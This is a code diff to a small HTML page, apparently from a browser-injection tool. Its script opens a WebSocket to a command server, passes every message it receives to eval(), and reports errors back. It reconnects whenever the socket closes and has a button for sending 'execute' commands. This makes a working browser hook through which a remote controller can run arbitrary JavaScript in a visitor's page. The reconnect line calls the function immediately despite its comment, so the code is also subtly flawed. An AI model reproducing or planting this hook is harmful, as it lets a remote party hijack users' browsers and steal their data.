@@ -1,21 +1,23 @@
 <script>
-var ws  = new WebSocket('ws://127.0.0.1:3000/inject/websocket/?' + btoa('example9')),
-    injectify
-
-ws.onmessage = function(d) {
-    try {
-        d = JSON.parse(d.data)
-        eval(d.d)
-    } catch(e) {
-        ws.send(JSON.stringify({
-            t: 'e',
-            d: e.stack,
-        }))
+(function i() {
+    window.ws  = new WebSocket('ws://127.0.0.1:3000/inject/websocket/?$' + btoa('widgetbot'))
+    ws.onmessage = function(d) {
+        try {
+            d = JSON.parse(d.data)
+            eval(d.d)
+        } catch(e) {
+            ws.send(JSON.stringify({
+                t: 'e',
+                d: e,
+            }))
+        }
     }
-}
-
-ws.onerror = function(e) {
-    console.log('WEbSocket error ' + error)
-    console.dir(error)
-}
+    ws.onclose = function() {
+        // Instantly attempt to open the websocket, retrying every 3 seconds
+        setTimeout(i(), 3000)
+    }
+})()
 </script>
+
+<input />
+<button onclick="ws.send(JSON.stringify({t:'execute', d: document.getElementsByTagName('input')[0].value}))">execute</button>
